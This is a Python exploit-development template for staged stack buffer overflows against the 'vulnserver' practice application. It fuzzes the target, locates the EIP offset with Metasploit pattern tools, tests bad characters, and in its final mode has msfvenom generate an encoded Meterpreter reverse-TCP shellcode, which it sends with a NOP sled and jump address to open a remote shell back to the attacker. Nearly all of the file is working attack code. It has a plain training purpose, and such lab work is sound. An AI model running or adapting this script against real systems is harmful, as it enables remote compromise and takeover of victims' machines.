#!/usr/bin/python3

########################################################################

"""
Author: 	Gary "kd" Contreras
Title:		Exploit Shadow Template
Purpose:	For use when doing exploit development
Original Test:	Tested against "vulnserver" application
Python Engine:	Python 3

Instructions to configure each step of this exploit development template:

*	Configure the file paths on lines 35-39 as required 																	(*****REQUIRED*****)
*	Configure your variables on lines 42-48; most of them are msfvenom switch options, and the "remoteapp" string is optional 								(*****REQUIRED*****)
*	Configure line 52 to have a blank byte array (b'') if it is not required; the "TRUN ." command is for vulnerserver only! 								(*****MOST LIKELY REQUIRED*****)
*	Configure line 134 to exclude whichever other "bad" bytes/characters you need/wish to exclude 												(*****MOST LIKELY REQUIRED*****)

This exploitation template is designed to be run in stages, where you can uncomment the next steps, based on what stage of exploit dev you're on.
The "maliciousbuffer" variable will automatically be updated based on the last steps that were left uncommented.

Usage (this will reveal some basic mode information):
	./exploitshadow.py
"""

########################################################################

import socket
import os
import sys
import datetime

#---------------Set the files for data input/output---------------

patternfile = '/home/kali/Desktop/pattern.txt'		# Path to the file that will store the pattern generated by pattern_create
shellcodefile = '/home/kali/Desktop/shellcode.bin'	# Path to the file that will store the raw shellcode payload
bytesfile = '/home/kali/Desktop/allbytes.bin'		# Path to the file that will store all byte values 0-255 minus "bad chars"
patterncreate = '/usr/bin/msf-pattern_create'		# Path to the "pattern_create" tool
patternoffset = '/usr/bin/msf-pattern_offset'		# Path to the "pattern_offset" tool

#---------------Prepare MSFVenom command to output a functional binary payload---------------
payload = 'windows/meterpreter/reverse_tcp'		# The type of payload you're having msfvenom craft
form = 'raw'						# Payload output format
arch = 'x86'						# CPU architecture
platform = 'windows'					# Operating system
encoder = 'x86/shikata_ga_nai'				# Msfvenom encoder to use
badchars = '\\x00\\x0a\\x0d'				# Add bad character bytes here as you find them
remoteapp = 'vulnserver'				# This is optional and only reports the name of the app you're attacking

#---------------Set up the trun command first (vulnserver only)---------------

truncmd = b'TRUN .'					# This was only useful for the "vulnserver" application; set to b'' if not needed!

#---------------Print basic usage information, if necessary---------------

try:
	if len(sys.argv) < 2 or (int(sys.argv[1]) > 5 and int(sys.argv[1]) < 1):
		print('[*] Usage:\n\t{0} <mode>\n\t\tValid Modes = 1-5'.format(sys.argv[0]))
		print('\n\t\tMode 1: Fuzz/Crash the system with a buffer of given length')
		print('\t\tMode 2: Generate/Send a unique pattern of a given length to the remote application')
		print('\t\tMode 3: Generate/Send a buffer with proper EIP offset plus all binary values 0-255 minus typically bad bytes/chars 0x00, 0x0a, 0x0d')
		print('\t\tMode 4: Generate/Send a fully and properly crafted/spaced payload, automatically generated by msfvenom')
		print('\t\tMode 5: Find a pattern offset, given a length and EIP register hex values')
		exit()
except:
	exit()

# Try to leave these alone, most of these variables are just placeholders :)
remotehost = ''
mode = sys.argv[1]
offset = 0
patternlength = 0

# Basic settings for modes 1,2,5
if mode == '1' or mode == '2' or mode == '5' and len(sys.argv) >= 3:
	try:
		patternlength = int(sys.argv[2])		# Get's the payload length from the command line
	except:
		print('[-] Warning: No buffer length was given')

#---------------Mode 1: Crash the program!---------------
######################################################################################
#	Here we just want to fuzz/crash the program, sending a bunch of uppercase A's
######################################################################################

if mode == '1':
	if len(sys.argv) < 5:
		print('[*] Usage:\n\t{0} 1 <bufferlength> <rhost> <rport>'.format(sys.argv[0]))
		exit()
	maliciousbuffer = truncmd + (b'\x41' * patternlength)
	remotehost = (sys.argv[3],int(sys.argv[4]))

#---------------Mode 2: Send the pattern!---------------
######################################################################################
#	Generate a unique pattern with "pattern_create" of 3000 characters and send it
######################################################################################
if mode == '2':
	if len(sys.argv) < 5:
		print('[*] Usage:\n\t{0} 2 <bufferlength> <rhost> <rport>'.format(sys.argv[0]))
		exit()
	pattern = ''
	patterncmd = '{0} -l {1} > {2}'.format(patterncreate, str(patternlength), patternfile)

	print('[*] Creating pattern with the following command:\n\t{0}\n\t\tStored at: {1}\n'.format(patterncmd, patternfile))
	os.system(patterncmd)

	with open(patternfile,'r') as infile:
		pattern += infile.read()

	maliciousbuffer = truncmd + pattern.strip().encode('utf-8')
	remotehost = (sys.argv[3],int(sys.argv[4]))

#---------------Mode 3: Send the bad characters!---------------
######################################################################################
#	Using the EIP offset you found, do a clean overwrite and send all byte values
######################################################################################
if mode == '3' or mode == '4' and len(sys.argv) >= 3:
	try:
		offset = int(sys.argv[2])				# This is the number of bytes required before EIP is overwritten
		nopsled1 = b'\x90' * offset				# This is a set of nops equal to the number of bytes offset before EIP
		nopsled2 = b'\x90' * 8					# This is a set of 8 nops meant to come after the EIP overwrite
		fourbs = b'\x42' * 4					# This is the four uppercase B's that will overwrite EIP during testing
	except:
		print('[-] Warning: No offset was given')

if mode == '3':
	if len(sys.argv) < 5:
		print('[*] Usage:\n\t{0} 3 <offset> <rhost> <rport>'.format(sys.argv[0]))
		exit()
	
	allbytes = b''						# This byte array will hold all "potential" byte values, minus the ones deemed "bad"
	
	for i in range(0,256):
		if i != 0x00 and i != 0x0a and i != 0x0d:	# Add bad character bytes here as you find them; the first 3 were added by default (00, 0a, 0d)
			allbytes += i.to_bytes(1,'little')

	with open(bytesfile,'wb') as outfile:
		outfile.write(allbytes)
	
	maliciousbuffer = truncmd + nopsled1 + fourbs + nopsled2 + allbytes
	remotehost = (sys.argv[3],int(sys.argv[4]))

#---------------Mode 4: 0hn03s, it's the m3t3rpr3t3r!---------------
######################################################################################
#	Generate the raw shellcode file, omitting bad characters, and send it!
######################################################################################
if mode == '4':
	if len(sys.argv) < 8:
		print('[*] Usage:\n\t{0} 4 <offset> <jmpaddr> <lhost> <lport> <rhost> <rport>\n\t\tNote: The jmpaddr address that overwrites EIP is automatically converted to little-endian format for you!'.format(sys.argv[0]))
		exit()
	jmpaddr = (int(sys.argv[3],16)).to_bytes(4,'little')	# This is the address what will overwrite EIP during actual exploitation
	lhost = sys.argv[4]					# LHOST (the IP of your exploit handler system)
	lport = sys.argv[5]					# LPORT (the one your exploit handler listens on)
	msfvenomcmd = 'msfvenom -p {0} LHOST={1} LPORT={2} -f {3} -a {4} --platform \'{5}\' -e {6} -b \'{7}\' -o {8}'.format(payload, lhost, lport, form, arch, platform, encoder, badchars, shellcodefile)
	print('[*] Generating raw shellcode with the following command:\n\t{0}\n\t\tStored at: {1}\n'.format(msfvenomcmd, shellcodefile))
	os.system(msfvenomcmd)

	shellcode = b''

	print('\n[*] Reading payload from shellcode file \'{0}\''.format(shellcodefile))
	with open(shellcodefile,'rb') as infile:
		shellcode += infile.read()

	maliciousbuffer = truncmd + nopsled1 + jmpaddr + nopsled2 + shellcode
	remotehost = (sys.argv[6],int(sys.argv[7]))

#---------------Mode 5: Locate Pattern Offset---------------
######################################################################################
#	Generate the raw shellcode file, omitting bad characters, and send it!
######################################################################################
if mode == '5':
	if len(sys.argv) < 4:
		print('[*] Usage:\n\t{0} 5 <bufferlength> <EIPvalue>'.format(sys.argv[0]))
		exit()
	
	patternoffsetcmd = '{0} -l {1} -q {2}'.format(patternoffset, str(patternlength), sys.argv[3])
	print('[*] Finding pattern offset\n')
	os.system(patternoffsetcmd)
	
	exit()

#---------------Set up the network connection and send a malicious buffer---------------

######################################################################################
#	Set up an "IPv4/TCP" socket and connect to the remote host
######################################################################################

csock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
csock.connect(remotehost)

######################################################################################
#	Send the malicious buffer
######################################################################################
print('[*] Attacking application "{0}" hosted on {1}:{2}'.format(remoteapp, remotehost[0], remotehost[1]))
csock.send(maliciousbuffer)

######################################################################################
#	Disconnect and exit
######################################################################################

csock.close()
print('[*] Sent malicious buffer of {0} bytes'.format(len(maliciousbuffer)))
print('\n[*] Buffer Preview')
print('\tFirst 15: {0}'.format(maliciousbuffer[0:15]))
print('\tEIP: {0}'.format(maliciousbuffer[(offset+len(truncmd)):(offset+4+len(truncmd))]))
print('\tLast 15: {0}'.format(maliciousbuffer[len(maliciousbuffer)-15:len(maliciousbuffer)]))
print('\n[*] Payload sent @ {0} UTC! If you\'re on the last step, my spirit is with you on your quest for sessions!'.format(datetime.datetime.utcnow().strftime('%m/%d/%Y %H:%M:%S %p')))